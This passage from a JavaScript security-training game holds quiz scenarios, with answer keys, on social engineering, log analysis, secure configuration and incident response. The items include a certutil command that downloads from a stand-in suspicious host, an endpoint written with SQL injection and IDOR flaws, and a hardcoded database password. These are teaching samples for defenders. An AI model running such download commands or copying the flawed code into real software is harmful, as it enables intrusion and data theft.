                                details: 'Caller says CEO has a board presentation in 15 minutes and needs files from Jessica\'s computer. Asking for immediate password reset over the phone. Caller ID shows "Mobile Number"',
                                manager: 'N/A'
                            },
                            question: "How should you handle this urgent request?",
                            choices: [
                                { id: 'a', text: "Reset the password immediately - the CEO needs those files" },
                                { id: 'b', text: "Verify identity through established procedures before any reset" },
                                { id: 'c', text: "Ask security questions and if they pass, reset the password" },
                                { id: 'd', text: "Tell them to have the CEO call directly" }
                            ],
                            correct: 'b',
                            explanation: "This is a classic social engineering attack. Urgency and authority figures are used to pressure you into skipping verification. Always follow established identity verification procedures.",
                            lesson: "Never skip identity verification procedures, no matter how urgent the request seems."
                        },
                        {
                            id: 'hd_vendor_1',
                            type: 'phone',
                            category: 'socialEngineering',
                            difficulty: 'hard',
                            setup: 'You receive a call from someone claiming to be from Microsoft:',
                            content: {
                                caller: 'Microsoft Support (Claimed)',
                                transcript: `"Hi, this is the Microsoft 365 support team. We've detected critical vulnerabilities in your tenant that hackers are actively exploiting. I need your global admin credentials to apply an emergency patch. This can't wait for a ticket - other organizations have already been breached."`
                            },
                            question: "How do you respond?",
                            choices: [
                                { id: 'a', text: "Provide credentials - Microsoft needs to fix the vulnerability" },
                                { id: 'b', text: "Ask for their Microsoft employee ID first" },
                                { id: 'c', text: "Refuse, inform them you'll contact Microsoft through official channels, and report this call" },
                                { id: 'd', text: "Create a support ticket with the information they provided" }
                            ],
                            correct: 'c',
                            explanation: "Microsoft will never cold-call and ask for credentials. This is a common attack vector against IT staff. Always initiate vendor contact through official channels.",
                            lesson: "Legitimate vendors never cold-call asking for credentials - always initiate contact yourself."
                        },
                        {
                            id: 'hd_access_1',
                            type: 'chat',
                            category: 'socialEngineering',
                            difficulty: 'medium',
                            setup: 'You receive this message on Teams:',
                            content: {
                                channel: 'Direct Message',
                                messages: [
                                    { user: 'Dave from Marketing', userType: 'internal', time: '3:15 PM', text: 'Hey! Quick favor - can you add me to the HR-Confidential SharePoint site? I need to check something for a project.' },
                                    { user: 'Dave from Marketing', userType: 'internal', time: '3:15 PM', text: 'Manager approved it but they\'re OOO and can\'t submit the request formally' }
                                ]
                            },
                            question: "What's the correct response?",
                            choices: [
                                { id: 'a', text: "Add them - they said manager approved" },
                                { id: 'b', text: "Add them temporarily and remove access tomorrow" },
                                { id: 'c', text: "Require a formal access request through proper channels" },
                                { id: 'd', text: "Check with HR if Dave should have access" }
                            ],
                            correct: 'c',
                            explanation: "Bypassing access request procedures creates security gaps and audit issues. Always require formal requests through proper channels with documented approvals.",
                            lesson: "Always require formal access requests - verbal/chat approvals aren't sufficient."
                        },
                        {
                            id: 'hd_email_1',
                            type: 'email',
                            category: 'phishing',
                            difficulty: 'medium',
                            setup: 'A user forwards you this email asking if it\'s legitimate:',
                            content: {
                                from: { name: 'Microsoft Account Team', email: 'security@microsoft.com', external: true },
                                to: 'user@company.com',
                                subject: 'Unusual sign-in activity',
                                time: '8:30 AM',
                                body: `We detected something unusual about a recent sign-in.

Sign-in details:
Country/region: Russia
IP address: 185.220.101.47
Date: Today at 3:47 AM

If this was you, ignore this message. If not, secure your account:

<a href="#">Review your security info</a>

The Microsoft account team`,
                                warning: null
                            },
                            question: "What should you advise the user?",
                            choices: [
                                { id: 'a', text: "Click the link immediately to secure the account" },
                                { id: 'b', text: "The email looks legitimate - probably safe to click" },
                                { id: 'c', text: "Don't click. Go directly to account.microsoft.com and review security there" },
                                { id: 'd', text: "Forward it to Microsoft to verify" }
                            ],
                            correct: 'c',
                            explanation: "Even if an email appears legitimate, always navigate directly to known URLs instead of clicking email links. The safe approach is the same whether the email is real or fake.",
                            lesson: "Always advise users to navigate directly to official sites rather than clicking email links."
                        },
                        {
                            id: 'hd_usb_1',
                            type: 'scenario',
                            category: 'malware',
                            difficulty: 'easy',
                            setup: 'A user brings a USB drive they found in the parking lot:',
                            content: {
                                context: 'The USB has a label that says "Salary Data 2024"',
                                quote: '"Hey, I found this in the parking lot. Can you plug it in and see whose it is so we can return it?"'
                            },
                            question: "What should you do with this USB drive?",
                            choices: [
                                { id: 'a', text: "Plug it in to a test computer to identify the owner" },
                                { id: 'b', text: "Don't plug it in - report it as a potential security threat" },
                                { id: 'c', text: "Give it back to the user to turn in to lost and found" },
                                { id: 'd', text: "Scan it with antivirus before opening" }
                            ],
                            correct: 'b',
                            explanation: "USB drops are a common attack vector. Attackers intentionally leave malicious USBs in parking lots, lobbies, etc. Never plug in unknown devices.",
                            lesson: "Never plug in unknown USB devices - they could contain malware that executes automatically."
                        }
                    ],
                    boss: {
                        id: 'social_engineer',
                        name: 'THE SOCIAL ENGINEER',
                        title: 'Master of Manipulation',
                        avatar: '🎭',
                        health: 100,
                        dialogue: [
                            "Humans are always the weakest link. Let me show you why...",
                            "Your procedures mean nothing when I control the conversation!"
                        ],
                        attacks: [
                            {
                                name: "Executive Impersonation",
                                description: "A convincing voice attack",
                                scenario: {
                                    type: 'phone',
                                    category: 'socialEngineering',
                                    content: {
                                        caller: 'CEO (Claimed)',
                                        transcript: '"This is [CEO Name]. I\'m at an offsite with no computer access. I need you to reset my password right now and give me the temporary one over the phone. This is urgent."'
                                    },
                                    question: "How do you respond to the 'CEO'?",
                                    choices: [
                                        { id: 'a', text: "Reset immediately - it's the CEO" },
                                        { id: 'b', text: "Follow standard verification procedures regardless of who they claim to be" },
                                        { id: 'c', text: "Ask security questions" },
                                        { id: 'd', text: "Tell them to use self-service reset" }
                                    ],
                                    correct: 'b'
                                },
                                damage: 30
                            },
                            {
                                name: "Vendor Impersonation",
                                description: "Fake vendor support call",
                                scenario: {
                                    type: 'phone',
                                    category: 'socialEngineering',
                                    content: {
                                        caller: 'Dell Support (Claimed)',
                                        transcript: '"This is Dell ProSupport. We\'ve detected your server is about to fail and need remote access to prevent data loss. What\'s your TeamViewer ID?"'
                                    },
                                    question: "Your response?",
                                    choices: [
                                        { id: 'a', text: "Provide the TeamViewer ID - server failure is serious" },
                                        { id: 'b', text: "Hang up and contact Dell through official channels to verify" },
                                        { id: 'c', text: "Ask for their Dell employee ID" },
                                        { id: 'd', text: "Check the server yourself first" }
                                    ],
                                    correct: 'b'
                                },
                                damage: 30
                            }
                        ]
                    }
                }
            },
            
            // ==========================================
            // SECURITY ANALYST SCENARIOS
            // ==========================================
            analyst: {
                1: {
                    name: "Threat Detection & Analysis",
                    description: "Identify and analyze security threats in your environment.",
                    scenarios: [
                        {
                            id: 'sa_log_1',
                            type: 'logs',
                            category: 'incidentResponse',
                            difficulty: 'hard',
                            setup: 'You\'re reviewing authentication logs and notice this pattern:',
                            content: {
                                logs: [
                                    { time: '02:15:03', event: 'AUTH_FAIL', user: 'admin', source: '185.220.101.47', detail: 'Invalid password' },
                                    { time: '02:15:04', event: 'AUTH_FAIL', user: 'administrator', source: '185.220.101.47', detail: 'Invalid password' },
                                    { time: '02:15:05', event: 'AUTH_FAIL', user: 'root', source: '185.220.101.47', detail: 'Account does not exist' },
                                    { time: '02:15:06', event: 'AUTH_FAIL', user: 'sysadmin', source: '185.220.101.47', detail: 'Invalid password' },
                                    { time: '02:17:23', event: 'AUTH_SUCCESS', user: 'svc_backup', source: '185.220.101.47', detail: 'MFA bypassed - legacy exception' }
                                ]
                            },
                            question: "What's the most critical concern in these logs?",
                            choices: [
                                { id: 'a', text: "The failed login attempts from Russia" },
                                { id: 'b', text: "The successful login to svc_backup after credential spraying, with MFA bypassed" },
                                { id: 'c', text: "Someone trying to access a 'root' account that doesn't exist" },
                                { id: 'd', text: "The attacks happening at 2 AM" }
                            ],
                            correct: 'b',
                            explanation: "The critical issue is the SUCCESSFUL login after credential spraying, especially to a service account with MFA bypass. This indicates the attacker gained valid credentials.",
                            lesson: "Focus on successful authentications after failed attempts - especially for service accounts with MFA exceptions."
                        },
                        {
                            id: 'sa_alert_1',
                            type: 'alert',
                            category: 'malware',
                            difficulty: 'medium',
                            setup: 'Your SIEM generates this alert:',
                            content: {
                                alertTitle: 'Suspicious PowerShell Activity',
                                severity: 'High',
                                source: 'Endpoint: WKSTN-JSMITH',
                                details: 'PowerShell execution with encoded command detected. Process spawned from WINWORD.EXE. Command contained "IEX", "DownloadString".',
                                timeline: [
                                    '14:22:01 - User opens email attachment (Q4_Report.docm)',
                                    '14:22:03 - WINWORD.EXE spawns PowerShell.exe',
                                    '14:22:04 - Encoded PS command executed',
                                    '14:22:05 - Outbound connection to 45.33.32.156'
                                ]
                            },
                            question: "What's your immediate priority action?",
                            choices: [
                                { id: 'a', text: "Email the user asking what they downloaded" },
                                { id: 'b', text: "Isolate the endpoint from the network immediately" },
                                { id: 'c', text: "Wait for antivirus to catch it" },
                                { id: 'd', text: "Block the external IP at the firewall" }
                            ],
                            correct: 'b',
                            explanation: "This is active malware - PowerShell launched from Word (macro malware) with a download cradle. Immediate network isolation prevents lateral movement and data exfiltration.",
                            lesson: "Word spawning PowerShell with encoded commands is malware - isolate immediately before it spreads."
                        },
                        {
                            id: 'sa_phish_1',
                            type: 'email',
                            category: 'phishing',
                            difficulty: 'hard',
                            setup: 'A user reported this email as suspicious. Analyze it:',
                            content: {
                                from: { name: 'DocuSign', email: 'dse_na4@docusign.net', external: true },
                                to: 'legal@company.com',
                                subject: 'Complete your required signature - NDA Agreement',
                                time: '9:41 AM',
                                body: `A document is waiting for your signature.

COMPANY CONFIDENTIALITY AGREEMENT - 2024 UPDATE

All employees must review and sign by Friday.

<a href="#">REVIEW DOCUMENT</a>

This is an automated notification.
DocuSign`,
                                headers: 'Return-Path: bounce-234@mail.dcsignz.com',
                                warning: null
                            },
                            question: "What makes this email suspicious?",
                            choices: [
                                { id: 'a', text: "Nothing - DocuSign.net is a legitimate DocuSign domain" },
                                { id: 'b', text: "The Return-Path shows it came from 'dcsignz.com', not DocuSign" },
                                { id: 'c', text: "NDAs always need to be signed in person" },
                                { id: 'd', text: "The link looks suspicious" }
                            ],
                            correct: 'b',
                            explanation: "While the 'From' looks legitimate, the email headers reveal the truth. The Return-Path shows 'dcsignz.com' - a spoofed domain. Always check headers for origin mismatches.",
                            lesson: "Always examine email headers - the 'From' address can be spoofed but headers reveal the true origin."
                        },
                        {
                            id: 'sa_network_1',
                            type: 'logs',
                            category: 'incidentResponse',
                            difficulty: 'hard',
                            setup: 'Network monitoring shows unusual traffic from a server:',
                            content: {
                                logs: [
                                    { time: '01:15:00', event: 'OUTBOUND', source: 'DB-PROD-01', dest: 'pastebin.com', detail: '2.3 MB' },
                                    { time: '01:18:00', event: 'OUTBOUND', source: 'DB-PROD-01', dest: 'pastebin.com', detail: '2.1 MB' },
                                    { time: '01:21:00', event: 'OUTBOUND', source: 'DB-PROD-01', dest: 'pastebin.com', detail: '2.4 MB' },
                                    { time: '01:24:00', event: 'OUTBOUND', source: 'DB-PROD-01', dest: 'pastebin.com', detail: '2.2 MB' },
                                    { time: '01:27:00', event: 'OUTBOUND', source: 'DB-PROD-01', dest: 'pastebin.com', detail: '2.5 MB' }
                                ],
                                note: 'DB-PROD-01 is a production database server containing customer PII'
                            },
                            question: "What type of incident is this most likely?",
                            choices: [
                                { id: 'a', text: "Normal backup traffic" },
                                { id: 'b', text: "Data exfiltration - a database server shouldn't be sending data to Pastebin" },
                                { id: 'c', text: "Someone on the team running tests" },
                                { id: 'd', text: "False positive - Pastebin is a legitimate site" }
                            ],
                            correct: 'b',
                            explanation: "Production database servers should never communicate with pastebin.com. This pattern indicates data exfiltration. This is a high-severity incident.",
                            lesson: "Database servers should have restricted outbound access - unusual destinations indicate data exfiltration."
                        },
                        {
                            id: 'sa_threat_1',
                            type: 'alert',
                            category: 'malware',
                            difficulty: 'medium',
                            setup: 'EDR detects suspicious process behavior:',
                            content: {
                                alertTitle: 'Suspicious Process Chain',
                                severity: 'Medium',
                                source: 'Server: EXCH-01',
                                details: 'w3wp.exe spawned cmd.exe which spawned certutil.exe with "-urlcache -split -f" parameters',
                                timeline: [
                                    '09:15:22 - w3wp.exe (IIS) spawns cmd.exe',
                                    '09:15:23 - cmd.exe spawns certutil.exe',
                                    '09:15:24 - Download attempt to suspicious URL'
                                ]
                            },
                            question: "What attack is this most likely?",
                            choices: [
                                { id: 'a', text: "Normal system maintenance" },
                                { id: 'b', text: "Web shell execution - IIS spawning cmd.exe indicates webshell compromise" },
                                { id: 'c', text: "Failed Windows Update" },
                                { id: 'd', text: "Administrator running diagnostics" }
                            ],
                            correct: 'b',
                            explanation: "IIS (w3wp.exe) spawning cmd.exe is a classic indicator of web shell activity. Certutil is being used as a LOLBin to download additional malware. This indicates an Exchange server compromise.",
                            lesson: "Web servers spawning command shells is a strong indicator of web shell compromise - investigate immediately."
                        }
                    ],
                    boss: {
                        id: 'apt_shadow',
                        name: 'APT SHADOW',
                        title: 'Advanced Persistent Threat',
                        avatar: '👁️',
                        health: 100,
                        dialogue: [
                            "I've been in your network for months. You're just now noticing?",
                            "Your detection is impressive... but can you contain me?"
                        ],
                        attacks: [
                            {
                                name: "Living Off the Land",
                                description: "Malicious activity using legitimate tools",
                                scenario: {
                                    type: 'alert',
                                    category: 'malware',
                                    content: {
                                        alertTitle: 'Suspicious certutil.exe Activity',
                                        severity: 'Medium',
                                        details: 'certutil.exe -urlcache -split -f https://suspicious.com/file.txt executed on DC-01'
                                    },
                                    question: "Is this malicious?",
                                    choices: [
                                        { id: 'a', text: "No - certutil is a legitimate Windows tool" },
                                        { id: 'b', text: "Yes - certutil is being used to download files, a known LOLBin technique" },
                                        { id: 'c', text: "Need more context" },
                                        { id: 'd', text: "Only if the domain is blacklisted" }
                                    ],
                                    correct: 'b'
                                },
                                damage: 25
                            },
                            {
                                name: "Lateral Movement",
                                description: "Moving through the network",
                                scenario: {
                                    type: 'logs',
                                    category: 'incidentResponse',
                                    content: {
                                        logs: [
                                            { time: '03:00:01', event: 'LOGON', user: 'DA-admin', source: 'WKSTN-042', detail: 'Type 10 (RemoteInteractive)' },
                                            { time: '03:00:15', event: 'LOGON', user: 'DA-admin', source: 'SERVER-01', detail: 'Type 3 (Network)' },
                                            { time: '03:01:02', event: 'LOGON', user: 'DA-admin', source: 'DC-01', detail: 'Type 3 (Network)' }
                                        ],
                                        note: 'DA-admin is a Domain Admin account'
                                    },
                                    question: "What's happening here?",
                                    choices: [
                                        { id: 'a', text: "Normal admin activity" },
                                        { id: 'b', text: "Lateral movement using compromised Domain Admin credentials at 3 AM" },
                                        { id: 'c', text: "Scheduled maintenance" },
                                        { id: 'd', text: "Can't tell without more data" }
                                    ],
                                    correct: 'b'
                                },
                                damage: 30
                            }
                        ]
                    }
                }
            },
            
            // ==========================================
            // SECURITY ENGINEER SCENARIOS
            // ==========================================
            engineer: {
                1: {
                    name: "Secure Configuration & Architecture",
                    description: "Design and maintain secure systems.",
                    scenarios: [
                        {
                            id: 'se_cloud_1',
                            type: 'config',
                            category: 'secureConfiguration',
                            difficulty: 'hard',
                            setup: 'You\'re reviewing an S3 bucket configuration:',
                            content: {
                                resource: 'AWS S3 Bucket: company-app-data',
                                config: [
                                    { setting: 'Block Public Access', value: 'Disabled', status: 'danger' },
                                    { setting: 'Bucket Policy', value: 'Principal: "*"', status: 'danger' },
                                    { setting: 'Encryption', value: 'AES-256', status: 'ok' },
                                    { setting: 'Versioning', value: 'Disabled', status: 'warning' },
                                    { setting: 'Logging', value: 'Disabled', status: 'warning' }
                                ],
                                note: 'Developer says this config is needed for a mobile app to access files'
                            },
                            question: "What's the most critical security issue?",
                            choices: [
                                { id: 'a', text: "Versioning is disabled" },
                                { id: 'b', text: "The bucket is publicly accessible to everyone on the internet" },
                                { id: 'c', text: "Logging is disabled" },
                                { id: 'd', text: "The encryption should be KMS instead of AES-256" }
                            ],
                            correct: 'b',
                            explanation: "A bucket policy with Principal: '*' means anyone on the internet can access this data. Use CloudFront with signed URLs or presigned URLs instead.",
                            lesson: "Never allow public access to S3 buckets containing application data - use presigned URLs or CloudFront."
                        },
                        {
                            id: 'se_vuln_1',
                            type: 'scenario',
                            category: 'secureConfiguration',
                            difficulty: 'medium',
                            setup: 'A vulnerability scan reveals CVE-2024-XXXX (CVSS 9.8) on a production server:',
                            content: {
                                context: 'The vulnerability is in Apache Struts and allows remote code execution. The server hosts the customer portal.',
                                details: 'Dev team says they need 2 weeks to test the patch. Server handles $50K/day in transactions.'
                            },
                            question: "What's the appropriate response?",
                            choices: [
                                { id: 'a', text: "Wait for the dev team to complete testing" },
                                { id: 'b', text: "Implement compensating controls (WAF rules, network restrictions) while expediting patch testing" },
                                { id: 'c', text: "Apply the patch immediately to production" },
                                { id: 'd', text: "Disable the server until patched" }
                            ],
                            correct: 'b',
                            explanation: "A CVSS 9.8 RCE vulnerability requires immediate action, but blindly patching production is risky. Implement compensating controls while expediting patch testing.",
                            lesson: "For critical vulnerabilities, implement compensating controls immediately while testing patches."
                        },
                        {
                            id: 'se_api_1',
                            type: 'code',
                            category: 'secureConfiguration',
                            difficulty: 'hard',
                            setup: 'You\'re reviewing API endpoint security:',
                            content: {
                                endpoint: 'GET /api/users/{userId}/profile',
                                auth: 'Bearer token required',
                                code: `
// User profile endpoint
app.get('/api/users/:userId/profile', authenticate, (req, res) => {
  const userId = req.params.userId;
  const user = db.query('SELECT * FROM users WHERE id = ' + userId);
  res.json(user);
});`
                            },
                            question: "What security vulnerabilities exist in this code?",
                            choices: [
                                { id: 'a', text: "No authorization check - any authenticated user can access any profile (IDOR)" },
                                { id: 'b', text: "SQL injection - the userId is concatenated directly into the query" },
                                { id: 'c', text: "Both A and B are vulnerabilities" },
                                { id: 'd', text: "The code is secure - authentication is implemented" }
                            ],
                            correct: 'c',
                            explanation: "Two critical vulnerabilities: SQL Injection (userId concatenated into query) and IDOR (no check if authenticated user can access the requested profile).",
                            lesson: "Always use parameterized queries AND verify the authenticated user is authorized to access the resource."
                        },
                        {
                            id: 'se_network_1',
                            type: 'config',
                            category: 'secureConfiguration',
                            difficulty: 'medium',
                            setup: 'You\'re reviewing firewall rules for a DMZ server:',
                            content: {
                                resource: 'DMZ Web Server Firewall Rules',
                                config: [
                                    { setting: 'Allow HTTPS (443) from Any', value: 'Enabled', status: 'ok' },
                                    { setting: 'Allow HTTP (80) from Any', value: 'Redirect to HTTPS', status: 'ok' },
                                    { setting: 'Allow SSH (22) from Any', value: 'Enabled', status: 'danger' },
                                    { setting: 'Allow MySQL (3306) from Any', value: 'Enabled', status: 'danger' },
                                    { setting: 'Deny All Other', value: 'Enabled', status: 'ok' }
                                ]
                            },
                            question: "Which rules need to be changed?",
                            choices: [
                                { id: 'a', text: "SSH and MySQL should be restricted to internal management IPs only" },
                                { id: 'b', text: "HTTP should be completely blocked" },
                                { id: 'c', text: "The deny all rule should be first" },
                                { id: 'd', text: "All rules look appropriate for a DMZ server" }
                            ],
                            correct: 'a',
                            explanation: "SSH and database ports should never be open to 'Any' - especially in a DMZ. Restrict SSH to management networks and database to application servers only.",
                            lesson: "Management and database ports should never be open to the internet - restrict to specific internal IPs."
                        },
                        {
                            id: 'se_secret_1',
                            type: 'code',
                            category: 'secureConfiguration',
                            difficulty: 'medium',
                            setup: 'During a code review, you find this in the repository:',
                            content: {
                                endpoint: 'config/database.js',
                                auth: 'Production Configuration',
                                code: `
// Database configuration
module.exports = {
  host: 'prod-db.company.internal',
  user: 'app_user',
  password: 'Pr0d_P@ssw0rd!2024',
  database: 'customer_data'
};`
                            },
                            question: "What's the security issue and how should it be fixed?",
                            choices: [
                                { id: 'a', text: "Password is too weak - needs to be stronger" },
                                { id: 'b', text: "Credentials should never be in code - use a secrets manager or environment variables" },
                                { id: 'c', text: "The filename reveals it's a config file" },
                                { id: 'd', text: "The database name is too descriptive" }
                            ],
                            correct: 'b',
                            explanation: "Hardcoded credentials in code are a critical vulnerability. Anyone with repo access can see them, they're stored in git history forever, and they can't be rotated easily. Use secrets managers.",
                            lesson: "Never hardcode credentials - use secrets managers, environment variables, or vault services."
                        }
                    ],
                    boss: {
                        id: 'misconfig_master',
                        name: 'MISCONFIG MASTER',
                        title: 'Exploiter of Mistakes',
                        avatar: '⚡',
                        health: 100,
                        dialogue: [
                            "Secure code means nothing with insecure configs...",
                            "One misconfigured resource is all I need!"
                        ],
                        attacks: [
                            {
                                name: "Cloud Misconfiguration",
                                description: "Finding exposed cloud resources",
                                scenario: {
                                    type: 'config',
                                    category: 'secureConfiguration',
                                    content: {
                                        resource: 'Azure Blob Container',
                                        config: [
                                            { setting: 'Access Level', value: 'Blob (anonymous read)', status: 'danger' },
                                            { setting: 'Contents', value: 'customer_database_backup.sql', status: 'danger' }
                                        ]
                                    },
                                    question: "What's the risk level?",
                                    choices: [
                                        { id: 'a', text: "Low - it's just a backup" },
                                        { id: 'b', text: "Critical - customer database backup is publicly downloadable" },
                                        { id: 'c', text: "Medium - depends on the data" },
                                        { id: 'd', text: "None - blob storage is secure" }
                                    ],
                                    correct: 'b'
                                },
                                damage: 30
                            },
                            {
                                name: "Default Credentials",
                                description: "Exploiting unchanged defaults",
                                scenario: {
                                    type: 'scenario',
                                    category: 'secureConfiguration',
                                    content: {
                                        context: 'A new network appliance was deployed last week.',
                                        details: 'Admin interface is accessible at https://firewall.company.internal. Login: admin/admin'
                                    },
                                    question: "What's the vulnerability?",
                                    choices: [
                                        { id: 'a', text: "The URL is guessable" },
                                        { id: 'b', text: "Default credentials were never changed - critical security issue" },
                                        { id: 'c', text: "HTTPS should be HTTP internally" },
                                        { id: 'd', text: "Nothing - it's on the internal network" }
                                    ],
                                    correct: 'b'
                                },
                                damage: 30
                            }
                        ]
                    }
                }
            },
            
            // ==========================================
            // INCIDENT RESPONDER SCENARIOS
            // ==========================================
            responder: {
                1: {
                    name: "Incident Response & Containment",
                    description: "Handle active security incidents effectively.",
                    scenarios: [
                        {
                            id: 'ir_ransom_1',
                            type: 'alert',
                            category: 'incidentResponse',
                            difficulty: 'hard',
                            setup: 'Multiple workstations display ransomware notes. You\'re the first responder.',
                            content: {
                                alertTitle: 'RANSOMWARE OUTBREAK - ACTIVE',
                                severity: 'Critical',
                                source: '15 workstations and counting',
                                details: 'Ransom note demands 10 BTC. Files encrypted with .LOCKED extension. Spread appears via network shares.',
                                timeline: [
                                    '10:15 - First report from Marketing',
                                    '10:18 - 5 machines affected',
                                    '10:22 - Spreading to Finance',
                                    '10:25 - NOW: 15 machines affected'
                                ]
                            },
                            question: "What's your first priority action?",
                            choices: [
                                { id: 'a', text: "Start identifying patient zero" },
                                { id: 'b', text: "Isolate affected network segments immediately to stop spread" },
                                { id: 'c', text: "Begin restoring from backups" },
                                { id: 'd', text: "Contact the attackers to negotiate" }
                            ],
                            correct: 'b',
                            explanation: "During active ransomware, CONTAINMENT is the immediate priority. Isolate affected segments to prevent further spread. Then investigate and restore.",
                            lesson: "In active incidents, containment comes first - stop the bleeding before investigating."
                        },
                        {
                            id: 'ir_breach_1',
                            type: 'scenario',
                            category: 'incidentResponse',
                            difficulty: 'hard',
                            setup: 'Evidence suggests customer data was exfiltrated 3 days ago.',
                            content: {
                                context: 'Forensics found attacker accessed the customer database and exfiltrated 50,000 records with PII.',
                                details: 'Data includes names, emails, phone numbers, and last 4 digits of payment cards.'
                            },
                            question: "Beyond technical remediation, what's a critical next step?",
                            choices: [
                                { id: 'a', text: "Keep it quiet while investigating further" },
                                { id: 'b', text: "Engage legal and compliance - breach notification requirements may apply" },
                                { id: 'c', text: "Reset all passwords and close the ticket" },
                                { id: 'd', text: "Post details on social media for transparency" }
                            ],
                            correct: 'b',
                            explanation: "Data breaches involving PII often trigger mandatory notification requirements (GDPR 72-hour rule, state breach laws). Legal and compliance must be engaged immediately.",
                            lesson: "Data breaches require legal/compliance involvement - breach notification laws have strict timelines."
                        },
                        {
                            id: 'ir_evidence_1',
                            type: 'scenario',
                            category: 'incidentResponse',
                            difficulty: 'medium',
                            setup: 'You need to collect evidence from a compromised server.',
                            content: {
                                context: 'A Linux server was compromised. You need to preserve evidence.',
                                options: 'What should you capture first?'
                            },
                            question: "What's the correct evidence collection procedure?",
                            choices: [
                                { id: 'a', text: "Immediately power off to preserve disk state" },
                                { id: 'b', text: "Capture memory first (volatile), then disk image (non-volatile)" },
                                { id: 'c', text: "Run admin commands to check for malware" },
                                { id: 'd', text: "Clone the hard drive and start analyzing" }
                            ],
                            correct: 'b',
                            explanation: "Order of volatility matters in forensics. Capture volatile evidence first (memory, network connections) before it's lost. Then capture non-volatile (disk).",
                            lesson: "Capture volatile evidence (memory) first, then non-volatile (disk) - follow order of volatility."
                        },
                        {
                            id: 'ir_comm_1',
                            type: 'scenario',
                            category: 'incidentResponse',
                            difficulty: 'medium',
                            setup: 'During an active incident, the CEO asks for a status update:',
                            content: {
                                context: 'It\'s 2 hours into a significant incident. Investigation is ongoing.',
                                quote: '"The board is asking what happened. I need to tell them something in 30 minutes."'
                            },
                            question: "What should you communicate?",
                            choices: [
                                { id: 'a', text: "Give a complete technical breakdown" },
                                { id: 'b', text: "Say nothing until investigation is complete" },
                                { id: 'c', text: "Provide facts known so far, actions being taken, and clear unknowns without speculation" },
                                { id: 'd', text: "Blame the suspected vulnerable system" }
                            ],
                            correct: 'c',
                            explanation: "During incidents, leadership needs updates. Be factual: what we know, what we're doing, what we don't know yet. Don't speculate or assign blame mid-incident.",
                            lesson: "Communicate facts, actions, and unknowns during incidents - no speculation or premature blame."
                        },
                        {
                            id: 'ir_contain_1',
                            type: 'alert',
                            category: 'incidentResponse',
                            difficulty: 'hard',
                            setup: 'Your SOC detects command and control traffic from multiple endpoints:',
                            content: {
                                alertTitle: 'C2 BEACON DETECTED',
                                severity: 'Critical',
                                source: 'Multiple endpoints',
                                details: 'Cobalt Strike beacon traffic detected to known malicious IP. 8 endpoints showing periodic beaconing every 60 seconds.',
                                timeline: [
                                    'WKSTN-042, WKSTN-108, WKSTN-223',
                                    'SERVER-DEV-01, SERVER-DEV-02',
                                    'LAPTOP-EXEC-CFO, LAPTOP-EXEC-CEO',
                                    'DC-02 (Domain Controller)'
                                ]
                            },
                            question: "Given the compromised systems, what's your containment strategy?",
                            choices: [
                                { id: 'a', text: "Block the C2 IP at the firewall and monitor" },
                                { id: 'b', text: "Isolate all affected systems, assume domain compromise, and activate full IR plan" },
                                { id: 'c', text: "Focus on the executive laptops first" },
                                { id: 'd', text: "Run antivirus on all affected machines" }
                            ],
                            correct: 'b',
                            explanation: "With a Domain Controller compromised, assume full domain compromise. Cobalt Strike with DC access means the attacker likely has domain admin. Full IR activation and potential domain rebuild needed.",
                            lesson: "Domain Controller compromise = assume full domain compromise. Activate full incident response."
                        }
                    ],
                    boss: {
                        id: 'ransomware_gang',
                        name: 'RANSOMWARE GANG',
                        title: 'Digital Extortionists',
                        avatar: '💀',
                        health: 100,
                        dialogue: [
                            "Your data belongs to us now. Pay or lose everything!",
                            "Let's see how good your backups really are..."
                        ],
                        attacks: [
                            {
                                name: "Double Extortion",
                                description: "Threatening data leak",
                                scenario: {
                                    type: 'scenario',
                                    category: 'incidentResponse',
                                    content: {
                                        context: 'Ransomware gang contacts you:',
                                        quote: '"We have encrypted your files AND stolen 10TB of data. Pay within 48 hours or we leak it all."'
                                    },
                                    question: "What's your position on paying the ransom?",
                                    choices: [
                                        { id: 'a', text: "Pay to prevent the data leak" },
                                        { id: 'b', text: "Do not pay - engage law enforcement and begin breach notification" },
                                        { id: 'c', text: "Negotiate for a lower amount" },
                                        { id: 'd', text: "Ignore them - they're bluffing" }
                                    ],
                                    correct: 'b'
                                },
                                damage: 30
                            },
                            {
                                name: "Backup Destruction",
                                description: "Attacker targets backup systems",
                                scenario: {
                                    type: 'alert',
                                    category: 'incidentResponse',
                                    content: {
                                        alertTitle: 'Backup Server Alert',
                                        severity: 'Critical',
                                        details: 'Backup server BACKUP-01 showing ransomware activity. Veeam repositories being encrypted.'
                                    },
                                    question: "What should have prevented this?",
                                    choices: [
                                        { id: 'a', text: "Better antivirus on the backup server" },
                                        { id: 'b', text: "Air-gapped or immutable backups that attackers can't reach" },
                                        { id: 'c', text: "More frequent backups" },
                                        { id: 'd', text: "Cloud backups only" }
                                    ],
                                    correct: 'b'
                                },
                                damage: 35
                            }
                        ]
                    }
                }
            }
        };
    }

    // ==========================================
    // GAME INITIALIZATION & PARTICLES
    // ==========================================

    initParticles() {
        const canvas = document.getElementById('particle-canvas');
        if (!canvas) return;
        
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        const particles = [];
        for (let i = 0; i < 50; i++) {
            particles.push({
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height,
                vx: (Math.random() - 0.5) * 0.5,
                vy: (Math.random() - 0.5) * 0.5,
                size: Math.random() * 2 + 1
            });
        }
        
        const animate = () => {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = 'rgba(0, 245, 255, 0.5)';
            
            particles.forEach(p => {
                p.x += p.vx;
                p.y += p.vy;
                if (p.x < 0 || p.x > canvas.width) p.vx *= -1;
                if (p.y < 0 || p.y > canvas.height) p.vy *= -1;
                ctx.beginPath();
                ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
                ctx.fill();
            });
            
            requestAnimationFrame(animate);
        };
        animate();
        
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
    }

    bindKeyboardShortcuts() {
        document.addEventListener('keydown', (e) => {
            if (['a', 'b', 'c', 'd'].includes(e.key.toLowerCase())) {
                const btn = document.querySelector(`.choice-btn[data-choice="${e.key.toLowerCase()}"]:not(:disabled)`);
                if (btn) btn.click();
            }
            if (e.key === 'Escape') {
                const gameMenu = document.getElementById('game-menu');
                if (gameMenu?.classList.contains('active')) this.toggleMenu();
            }
        });
    }

    // ==========================================
    // MODAL SYSTEM
    // ==========================================

    openModal(modalId) {
